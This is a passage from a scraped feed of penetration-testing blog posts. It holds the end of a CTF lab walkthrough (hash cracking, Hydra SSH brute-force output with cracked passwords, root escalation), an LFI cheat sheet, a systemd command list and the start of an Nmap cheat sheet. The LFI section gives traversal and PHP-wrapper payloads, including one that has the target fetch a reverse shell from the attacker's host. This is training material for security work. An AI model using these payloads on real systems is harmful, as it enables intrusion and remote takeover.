42a7ccabfaea30678d6f1b80876773ef</code></pre> \n</figure> \n<h2 id=\"hashcat-md5-cracking\">Hashcat MD5 cracking</h2> \n<p>Hashcat wased to crack the hashes offline:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# hashcat <span class=\"nt\">--username</span> <span class=\"nt\">-m</span> 0 <span class=\"nt\">-a</span> 0 ctf8-hashes.txt\n/usr/share/wordlists/rockyou.txt</code></pre> \n</figure> \n<h2 id=\"hydra-ssh-brute-force\">Hydra SSH Brute Force</h2> \n<p>Hyrda was used to brute force SSH using the previously cracked password hashes:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>DATA] attacking service ssh on port 22\n\n<span class=\"o\">[</span>22][ssh] host: 192.168.221.135   login: jharraway   password: letmein!\n<span class=\"o\">[</span>22][ssh] host: 192.168.221.135   login: spinkton   password: football123\n<span class=\"o\">[</span>22][ssh] host: 192.168.221.135   login: bdio   password: passw0rd\n<span class=\"o\">[</span>STATUS] 167.00 tries/min, 167 tries <span class=\"k\">in </span>00:01h, 53 todo <span class=\"k\">in </span>00:01h, 5 active</code></pre> \n</figure> \n<h2 id=\"ssh-account-compromise\">SSH Account Compromise</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# ssh spinkton@192.168.221.135\n\nWelcome to LAMPSecurity Research SSH access!\n\n<span class=\"c\">#flag#5e937c51b852e1ee90d42ddb5ccb8997</span>\n\nUnauthorized access is expected...\n\nspinkton@192.168.221.135<span class=\"s1\">'s password:\nLast login: Thu Mar 27 12:48:29 2014 from 192.168.56.1\n#flag#motd-flag</span></code></pre> \n</figure> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>spinkton@localhost ~]<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> <span class=\"nt\">-s</span>\n\nPassword:\n\n<span class=\"o\">[</span>root@localhost ~]# <span class=\"nb\">id\n\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>\n<span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>,1<span class=\"o\">(</span>bin<span class=\"o\">)</span>,2<span class=\"o\">(</span>daemon<span class=\"o\">)</span>,3<span class=\"o\">(</span>sys<span class=\"o\">)</span>,4<span class=\"o\">(</span>adm<span class=\"o\">)</span>,6<span class=\"o\">(</span>disk<span class=\"o\">)</span>,10<span class=\"o\">(</span>wheel<span class=\"o\">)</span>\n<span class=\"nv\">context</span><span class=\"o\">=</span>user_u:system_r:unconfined_t</code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Mon, 05 May 2014 11:00:59 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/ctf8/xss.png","linkMd5":"39e7a7bb5a561d657a8df2b3ac291e9f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn96@2020_3/2020/08/25/01-24-54-427_320cc5fda2e46580.webp","destWidth":1104,"destHeight":862,"sourceBytes":176483,"destBytes":37310,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/ctf8/xss.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn96@2020_3/2020/08/25/01-24-54-427_320cc5fda2e46580.webp","https://highon.coffee/img/blog/ctf8/xss-alert.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn76@2020_4/2020/08/25/01-25-15-917_41bb4ba77f85af4b.webp","https://highon.coffee/img/blog/ctf8/xss-cookie-hijack.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn76@2020_3/2020/08/25/01-25-15-752_8c5d225d1c28cb68.webp","https://highon.coffee/img/blog/ctf8/email-barbara.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn4@2020_2/2020/08/25/01-25-14-512_9bb50649cc9d4096.webp","https://highon.coffee/img/blog/ctf8/burp-swap-session-id.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn12@2020_3/2020/08/25/01-25-16-540_bb85f2cb8830f6e2.webp","https://highon.coffee/img/blog/ctf8/login-barbara.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn100@2020_4/2020/08/25/01-25-15-015_f4dd3d326875164f.webp","https://highon.coffee/img/blog/ctf8/php-reverse-shell.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn60@2020_1/2020/08/25/01-25-14-615_7aa82b614443636c.webp","https://highon.coffee/img/blog/ctf8/drupal-settings.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn40@2020_6/2020/08/25/01-25-16-886_6692382f95cd27b2.webp"},"publishedOrCreatedDate":1598318675557},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"LFI Cheat Sheet","link":"https://highon.coffee/blog/lfi-cheat-sheet/","description":"<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#what-is-an-lfi-vulnerability\" id=\"markdown-toc-what-is-an-lfi-vulnerability\">What is an LFI Vulnerability?</a></li> \n <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#how-to-get-a-shell-from-lfi\" id=\"markdown-toc-how-to-get-a-shell-from-lfi\">How to get a Shell from LFI</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#path-traversal-aka-directory-traversal\" id=\"markdown-toc-path-traversal-aka-directory-traversal\">Path Traversal aka Directory Traversal</a></li> \n   <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-expect-lfi\" id=\"markdown-toc-php-wrapper-expect-lfi\">PHP Wrapper expect:// LFI</a></li> \n   <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfile\" id=\"markdown-toc-php-wrapper-phpfile\">PHP Wrapper php://file</a></li> \n   <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfilter\" id=\"markdown-toc-php-wrapper-phpfilter\">PHP Wrapper php://filter</a></li> \n   <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#procselfenviron-lfi-method\" id=\"markdown-toc-procselfenviron-lfi-method\">/proc/self/environ LFI Method</a></li> \n   <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method\" id=\"markdown-toc-procselffd-lfi-method\">/proc/self/fd/ LFI Method</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#fimap-lfi-pen-testing-tool\" id=\"markdown-toc-fimap-lfi-pen-testing-tool\">fimap LFI Pen Testing Tool</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/lfi-cheat-sheet/#fimap--phpinfo-exploit\" id=\"markdown-toc-fimap--phpinfo-exploit\">fimap + phpinfo() Exploit</a></li> \n  </ul> </li> \n</ul> \n<h2 id=\"what-is-an-lfi-vulnerability\">What is an LFI Vulnerability?</h2> \n<p>LFI stands for <strong>Local File Includes</strong> - it’s a file local inclusion vulnerability that allows an attacker to include files that exist on the target web server. Typically this is exploited by abusing dynamic file inclusion mechanisms that don’t sanitize user input.</p> \n<!--more--> \n<p>Scripts that take filenames as parameters without sanitizing the user input are good candidates for LFI vulnerabilities, a good example would be the following PHP script <code>foo.php?file=image.jpg</code> which takes <code>image.jpg</code> as a parameter. An attacker would simply replace <code>image.jpg</code> and insert a payload. Normally a directory traversal payload is used that escapes the script directory and traverses the filesystem directory structure, exposing sensitive files such as <code>foo.php?file=../../../../../../../etc/passwd</code> or sensitive files within the web application itself. Exposing sensitive information or configuration files containing SQL usernames and passwords.</p> \n<p>Note: In some cases, depending on the nature of the LFI vulnerability it’s possible to run system executables.</p> \n<h2 id=\"how-to-get-a-shell-from-lfi\">How to get a Shell from LFI</h2> \n<p>Below are some techniques I’ve used in the past to gain a shell on systems with vulnerable LFI scripts exposed.</p> \n<hr /> \n<h3 id=\"path-traversal-aka-directory-traversal\">Path Traversal aka Directory Traversal</h3> \n<p>As mentioned above Traverse the filesystem directory structure to disclose sensitive information about the system that can help you gain a shell, usernames / passwords etc.</p> \n<hr /> \n<h3 id=\"php-wrapper-expect-lfi\">PHP Wrapper expect:// LFI</h3> \n<p>Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.</p> \n<p>An example of PHP expect:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">http://127.0.0.1/fileincl/example1.php?page<span class=\"o\">=</span>expect://ls</code></pre> \n</figure> \n<p>Below is the error received if the PHP expect wrapper is disabled:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"nx\">Warning</span><span class=\"o\">:</span> <span class=\"k\">include</span><span class=\"p\">()</span><span class=\"o\">:</span> <span class=\"nx\">Unable</span> <span class=\"nx\">to</span> <span class=\"nx\">find</span> <span class=\"nx\">the</span> <span class=\"nx\">wrapper</span> <span class=\"s2\">\"expect\"</span> <span class=\"o\">-</span> <span class=\"nx\">did</span> <span class=\"nx\">you</span> <span class=\"nx\">forget</span> <span class=\"nx\">to</span> <span class=\"nx\">enable</span> <span class=\"nx\">it</span> <span class=\"nx\">when</span> <span class=\"nx\">you</span><span class=\"o\">&lt;</span><span class=\"nx\">br</span><span class=\"o\">&gt;</span> <span class=\"nx\">configured</span> <span class=\"nx\">PHP</span><span class=\"o\">?</span> <span class=\"nx\">in</span> <span class=\"o\">/</span><span class=\"k\">var</span><span class=\"o\">/</span><span class=\"nx\">www</span><span class=\"o\">/</span><span class=\"nx\">fileincl</span><span class=\"o\">/</span><span class=\"nx\">example1</span><span class=\"o\">.</span><span class=\"nx\">php</span> <span class=\"nx\">on</span> <span class=\"nx\">line</span> <span class=\"mi\">7</span> <span class=\"nx\">Warning</span><span class=\"o\">:</span> <span class=\"k\">include</span><span class=\"p\">()</span><span class=\"o\">:</span> <span class=\"nx\">Unable</span> <span class=\"nx\">to</span> <span class=\"nx\">find</span> <span class=\"nx\">the</span><span class=\"o\">&lt;</span><span class=\"nx\">br</span><span class=\"o\">&gt;</span> <span class=\"nx\">wrapper</span> <span class=\"s2\">\"expect\"</span> <span class=\"o\">-</span> <span class=\"nx\">did</span> <span class=\"nx\">you</span> <span class=\"nx\">forget</span> <span class=\"nx\">to</span> <span class=\"nx\">enable</span> <span class=\"nx\">it</span> <span class=\"nx\">when</span> <span class=\"nx\">you</span> <span class=\"nx\">configured</span> <span class=\"nx\">PHP</span><span class=\"o\">?</span> <span class=\"nx\">in</span> <span class=\"o\">&lt;</span><span class=\"nx\">br</span><span class=\"o\">&gt;</span> <span class=\"o\">/</span><span class=\"k\">var</span><span class=\"o\">/</span><span class=\"nx\">www</span><span class=\"o\">/</span><span class=\"nx\">fileincl</span><span class=\"o\">/</span><span class=\"nx\">example1</span><span class=\"o\">.</span><span class=\"nx\">php</span> <span class=\"nx\">on</span> <span class=\"nx\">line</span> <span class=\"mi\">7</span> <span class=\"nx\">Warning</span><span class=\"o\">:</span> <span class=\"k\">include</span><span class=\"p\">(</span><span class=\"nx\">expect</span><span class=\"o\">://</span><span class=\"nx\">ls</span><span class=\"p\">)</span><span class=\"o\">:</span> <span class=\"nx\">failed</span> <span class=\"nx\">to</span> <span class=\"nx\">open</span> <span class=\"nx\">stream</span><span class=\"o\">:</span> <span class=\"nx\">No</span> <span class=\"nx\">such</span> <span class=\"nb\">file</span> <span class=\"k\">or</span> <span class=\"nx\">directory</span> <span class=\"nx\">in</span> <span class=\"o\">/</span><span class=\"k\">var</span><span class=\"o\">/</span><span class=\"nx\">www</span><span class=\"o\">/</span><span class=\"nx\">fileincl</span><span class=\"o\">/</span><span class=\"nx\">example1</span><span class=\"o\">.</span><span class=\"nx\">php</span> <span class=\"nx\">on</span> <span class=\"nx\">line</span> <span class=\"mi\">7</span> <span class=\"nx\">Warning</span><span class=\"o\">:</span> <span class=\"k\">include</span><span class=\"p\">()</span><span class=\"o\">:</span> <span class=\"nx\">Failed</span> <span class=\"nx\">opening</span> <span class=\"s1\">'expect://ls'</span> <span class=\"k\">for</span> <span class=\"nx\">inclusion</span> <span class=\"p\">(</span><span class=\"nx\">include_path</span><span class=\"o\">=</span><span class=\"s1\">'.:/usr/share/php:/usr/share/pear'</span><span class=\"p\">)</span> <span class=\"nx\">in</span> <span class=\"o\">/</span><span class=\"k\">var</span><span class=\"o\">/</span><span class=\"nx\">www</span><span class=\"o\">/</span><span class=\"nx\">fileincl</span><span class=\"o\">/</span><span class=\"nx\">example1</span><span class=\"o\">.</span><span class=\"nx\">php</span> <span class=\"nx\">on</span> <span class=\"nx\">line</span> <span class=\"mi\">7</span></code></pre> \n</figure> \n<hr /> \n<h3 id=\"php-wrapper-phpfile\">PHP Wrapper php://file</h3> \n<p>Another PHP wrapper, <code>php://input</code> your payload is sent in a POST request using curl, burp or hackbar to provide the post data is probably the easiest option.</p> \n<p><img src=\"https://highon.coffee/img/blog/web-for-penetration-testers/lfi-php-file-hackbar-pentesters-labs.png\" alt=\"LFI php://file hackbar\" /></p> \n<p>Example:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">http://192.168.183.128/fileincl/example1.php?page<span class=\"o\">=</span>php://input</code></pre> \n</figure> \n<p>Post Data payload, try something simple to start with like: <code> \n  <!--? system('uname -a');?--></code></p> \n<p>Then try and download a <a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/\">reverse shell</a> from your attacking machine using:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">&lt;? system<span class=\"o\">(</span><span class=\"s1\">'wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php'</span><span class=\"o\">)</span><span class=\"p\">;</span>?&gt;</code></pre> \n</figure> \n<p>After uploading execute the reverse shell at <code>http://192.168.183.129/shell.php</code></p> \n<hr /> \n<h3 id=\"php-wrapper-phpfilter\">PHP Wrapper php://filter</h3> \n<p>Another PHP wrapper, <code>php://filter</code> in this example the output is encoded using base64, so you’ll need to decode the output.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">http://192.168.155.131/fileincl/example1.php?page<span class=\"o\">=</span>php://filter/convert.base64-encode/resource<span class=\"o\">=</span>../../../../../etc/passwd</code></pre> \n</figure> \n<hr /> \n<h3 id=\"procselfenviron-lfi-method\">/proc/self/environ LFI Method</h3> \n<p>If it’s possible to include <code>/proc/self/environ</code> from your vulnerable LFI script, then code execution can be leveraged by manipulating the <code>User Agent</code> parameter with Burp. After the PHP code has been introduced <code>/proc/self/environ</code> can be executed via your vulnerable LFI script.</p> \n<hr /> \n<h3 id=\"procselffd-lfi-method\">/proc/self/fd/ LFI Method</h3> \n<p>Similar to the previous <code>/proc/self/environ</code> method, it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the <code>referer</code>.</p> \n<p>This method is a little tricky as the proc file that contains the Apache error log information changes under <code>/proc/self/fd/</code> e.g. <code>/proc/self/fd/2</code>, <code>/proc/self/fd/10</code> etc. I’d recommend brute forcing the directory structure of the /proc/self/fd/ directory with Burp Intruder + FuzzDB’s <a href=\"https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt\">LFI-FD-Check.txt</a> list of likely proc files, you can then monitor the returned page sizes and investigate.</p> \n<hr /> \n<h2 id=\"fimap-lfi-pen-testing-tool\">fimap LFI Pen Testing Tool</h2> \n<p>fimap is a <a href=\"https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/\">tool used on pen tests</a> that automates the above processes of discovering and exploiting LFI scripts. Upon discovering a vulnerable LFI script fimap will enumerate the local filesystem and search for writable log files or locations such as <code>/proc/self/environ</code>. Another tool commonly used by pen testes to automate LFI discovery is Kali’s dotdotpwn, which works in a similar way.</p> \n<hr /> \n<h3 id=\"fimap--phpinfo-exploit\">fimap + phpinfo() Exploit</h3> \n<p>Fimap exploits PHP’s temporary file creation via Local File Inclusion by abusing PHPinfo() information disclosure glitch to reveal the location of the created temporary file.</p> \n<p>If a phpinfo() file is present, it’s usually possible to get a shell, if you don’t know the location of the phpinfo file fimap can probe for it, or you could use a tool like OWASP DirBuster.</p> \n<p>Enjoy.</p>","descriptionType":"text/html","publishedDate":"Sun, 24 Apr 2016 11:29:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/web-for-penetration-testers/lfi-php-file-hackbar-pentesters-labs.png","linkMd5":"007a56097550cbc9af53328ae0ea3395","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn3@2020_3/2020/08/25/01-24-54-324_10399680ff425baf.webp","destWidth":1366,"destHeight":1012,"sourceBytes":101312,"destBytes":40824,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/web-for-penetration-testers/lfi-php-file-hackbar-pentesters-labs.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn3@2020_3/2020/08/25/01-24-54-324_10399680ff425baf.webp"},"publishedOrCreatedDate":1598318675547},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Systemd Cheat Sheet","link":"https://highon.coffee/blog/systemd-cheat-sheet/","description":"<p>Systemd is now the default in RHEL / CentOS 7, the following post is a cheat sheet for systemd commands, useful for local system enumeration.</p> \n<div class=\"note tip\"> \n <h5>Systemd is becoming the default on most distros</h5> \n <p>Systemd is becoming the default in many distros, <b>RHEL, CentOS, Ubuntu 15</b> and it offers a single command to manage your system, instead of switching between <code>chkconfig</code> or running init scripts.</p> \n</div> \n<h2 id=\"systemd-service-commands\">Systemd Service Commands</h2> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>systemctl stop service-name</code></p> </td> \n    <td> <p>systemd stop running service</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl start service-name</code></p> </td> \n    <td> <p>systemctl start service</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl restart service-name</code></p> </td> \n    <td> <p>systemd restart running service</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl reload service-name</code></p> </td> \n    <td> <p>reloads all config files for service</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl status service-name</code></p> </td> \n    <td> <p>systemctl show if service is running</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl enable service-name</code></p> </td> \n    <td> <p>systemctl start service at boot</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctrl disable service-name</code></p> </td> \n    <td> <p>systemctl - disable service at boot</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl show service-name</code></p> </td> \n    <td> <p>show systemctl service info</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl -H target command service-name</code></p> </td> \n    <td> <p>run systemctl commands remotely</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"systemd-information-commands\">Systemd Information Commands</h2> \n<p>Systemd commands that show useful system information.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>systemctl list-dependencies</code></p> </td> \n    <td> <p>show and units dependencies</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl list-sockets</code></p> </td> \n    <td> <p>systemd list sockets and activities</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl list-jobs</code></p> </td> \n    <td> <p>view active systemd jobs</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl list-unit-files</code></p> </td> \n    <td> <p>systemctl list unit files and their states</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl list-units</code></p> </td> \n    <td> <p>systemctl list default target (like run level)</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"changing-system-state\">Changing System State</h2> \n<p>systemd reboot, shutdown, default target etc</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>systemctl reboot</code></p> </td> \n    <td> <p>systemctl reboot the system</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl poweroff</code></p> </td> \n    <td> <p>systemctl shutdown (power off the system)</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl emergency</code></p> </td> \n    <td> <p>Put in emergency mode</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>systemctl default</code></p> </td> \n    <td> <p>systemctl default mode</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<p>##Systemctl Viewing Log Messages</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>journalctl</code></p> </td> \n    <td> <p>show all collected log messages</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>journalctl -u sshd.service</code></p> </td> \n    <td> <p>see sshd service messages</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>journelctl -f</code></p> </td> \n    <td> <p>follow messages as they appear</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>journelctl -k</code></p> </td> \n    <td> <p>show kernel messages only</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"text/html","publishedDate":"Mon, 29 Jun 2015 11:35:10 +0000","feedId":11390,"bgimg":"","linkMd5":"5be9bb8dc51aa2fd6d49ec592b669447","bgimgJsdelivr":"","metaImg":"","author":"Arr0way","publishedOrCreatedDate":1598318675550},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Nmap Cheat Sheet","link":"https://highon.coffee/blog/nmap-cheat-sheet/","description":"<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#nmap-examples\" id=\"markdown-toc-nmap-examples\">Nmap Examples</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#nmap-scan-from-file\" id=\"markdown-toc-nmap-scan-from-file\">Nmap scan from file</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#nmap-output-formats\" id=\"markdown-toc-nmap-output-formats\">Nmap output formats</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#nmap-netbios-examples\" id=\"markdown-toc-nmap-netbios-examples\">Nmap Netbios Examples</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#nmap-nikto-scan\" id=\"markdown-toc-nmap-nikto-scan\">Nmap Nikto Scan</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#nmap-cheatsheet\" id=\"markdown-toc-nmap-cheatsheet\">Nmap Cheatsheet</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#target-specification\" id=\"markdown-toc-target-specification\">Target Specification</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#host-discovery\" id=\"markdown-toc-host-discovery\">Host Discovery</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#scan-techniques\" id=\"markdown-toc-scan-techniques\">Scan Techniques</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#port-specification-and-scan-order\" id=\"markdown-toc-port-specification-and-scan-order\">Port Specification and Scan Order</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#service-version-detection\" id=\"markdown-toc-service-version-detection\">Service Version Detection</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#script-scan\" id=\"markdown-toc-script-scan\">Script Scan</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#os-detection\" id=\"markdown-toc-os-detection\">OS Detection</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#timing-and-performance\" id=\"markdown-toc-timing-and-performance\">Timing and Performance</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#firewalls-ids-evasion-and-spoofing\" id=\"markdown-toc-firewalls-ids-evasion-and-spoofing\">Firewalls IDS Evasion and Spoofing</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#nmap-output-options\" id=\"markdown-toc-nmap-output-options\">Nmap Output Options</a></li> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#misc-nmap-options\" id=\"markdown-toc-misc-nmap-options\">Misc Nmap Options</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#nmap-enumeration-examples\" id=\"markdown-toc-nmap-enumeration-examples\">Nmap Enumeration Examples</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/nmap-cheat-sheet/#enumerating-netbios\" id=\"markdown-toc-enumerating-netbios\">Enumerating Netbios</a></li> \n  </ul> </li> \n</ul> \n<p><strong>Nmap</strong> (network mapper), the god of port scanners used for network discovery and the basis for most security enumeration during the initial stages of a <a href=\"https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/\">penetration test</a>. The tool was written and maintained by Fyodor AKA Gordon Lyon.</p> \n<p><a href=\"http://nmap.org\">Nmap</a> displays exposed services on a target machine along with other useful information such as the verion and OS detection.</p> \n<p>Nmap has made twelve movie appearances, including The Matrix Reloaded, Die Hard 4, Girl With the Dragon Tattoo, and The Bourne Ultimatum.</p> \n<p><img src=\"https://highon.coffee/img/nmap-trinity.png\" alt=\"Nmap Trinity\" /></p> \n<p><strong>Nmap in a nutshell</strong></p> \n<ul> \n <li>Host discovery</li> \n <li>Port discovery / enumeration</li> \n <li>Service discovery</li> \n <li>Operating system version detection</li> \n <li>Hardware (MAC) address detection</li> \n <li>Service version detection</li> \n <li>Vulnerability / exploit detection, using Nmap scripts (NSE)</li> \n</ul> \n<h3 id=\"nmap-examples\">Nmap Examples</h3> \n<p>Basic Nmap scanning examples, often used at the first stage of enumeration.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>nmap -sP 10.0.0.0/24</code></p> </td> \n    <td> <p>Ping scans the network, listing machines that respond to ping.</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -p 1-65535 -sV -sS -T4 target</code></p> </td> \n    <td> <p>Full TCP port scan using with service version detection - usually my first scan, I find T4 more accurate than T5 and still \"pretty quick\".</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -v -sS -A -T4 target</code></p> </td> \n    <td> <p>Prints verbose output, runs stealth syn scan, T4 timing, OS and version detection + traceroute and scripts against target services.</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -v -sS -A -T5 target</code></p> </td> \n    <td> <p>Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection + traceroute and scripts against target services.</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -v -sV -O -sS -T5 target</code></p> </td> \n    <td> <p>Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection.</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -v -p 1-65535 -sV -O -sS -T4 target</code></p> </td> \n    <td> <p>Prints verbose output, runs stealth syn scan, T4 timing, OS and version detection + full port range scan.</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -v -p 1-65535 -sV -O -sS -T5 target</code></p> </td> \n    <td> <p>Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection + full port range scan.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"note info\"> \n <h5>Agressive scan timings are faster, but could yeild inaccurate results!</h5> \n <p>T5 uses very aggressive scan timings and could lead to missed ports, T4 is a better compromise if you need fast results.</p> \n</div> \n<h4 id=\"nmap-scan-from-file\">Nmap scan from file</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>nmap -iL ip-addresses.txt</code></p> </td> \n    <td> <p>Scans a list of IP addresses, you can add options before / after.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"nmap-output-formats\">Nmap output formats</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24</code></p> </td> \n    <td> <p>Outputs \"grepable\" output to a file, in this example Netbios servers.</p> <p>E.g, The output file could be grepped for \"Open\".</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -sS -sV -T5 10.0.1.99 --webxml -oX -<br /> | xsltproc --output file.html -</code></p> </td> \n    <td> <p>Export nmap output to HTML report. </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"nmap-netbios-examples\">Nmap Netbios Examples</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    